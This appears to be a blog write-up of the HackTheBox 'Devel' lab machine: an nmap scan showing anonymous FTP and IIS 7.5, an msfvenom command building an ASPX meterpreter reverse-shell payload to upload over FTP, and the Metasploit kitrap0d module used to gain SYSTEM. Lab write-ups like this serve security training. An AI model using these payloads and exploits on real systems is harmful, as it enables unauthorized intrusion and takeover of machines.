---
layout: post
title:  "HTB Devel Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---


# Nmap scan
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
```

# Exploitation
As the first scan shows, ftp is open and the web server is hosting the files put into ftp. We can create a aspx payload with msfvenom and upload that to test for a shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<X> LPORT=<X> -f aspx -o fml.aspx
```
Our metasploit handler returns a shell. Backgrounding the session allows us to take advantage of metasploits local_exploit/suggestor. Running this module returns some available modules that may work to get higher privileges.
```
use exploit/windows/local/ms10_015_kitrap0d
```
Running this module on the backgrounded session elevates us to SYSYEM


